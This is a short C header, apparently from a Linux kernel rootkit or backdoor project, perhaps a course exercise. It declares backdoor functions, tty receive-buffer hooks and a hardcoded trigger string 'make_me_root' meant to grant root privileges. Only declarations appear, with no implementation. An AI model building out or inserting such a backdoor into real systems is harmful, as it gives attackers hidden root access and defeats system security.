#ifndef _GROUP7_BACKDOOR_H
#define _GROUP7_BACKDOOR_H

#define G7_BACKDOOR_MSG "make_me_root"

void backdoor_read(void);
void backdoor_tty(void);
void unbackdoor(void);

// hooks
void g7_receive_buf(struct tty_struct *, const unsigned char *, char *, int);
int g7_receive_buf2(struct tty_struct *, const unsigned char *, char *, int);

#endif//_GROUP7_BACKDOOR_H
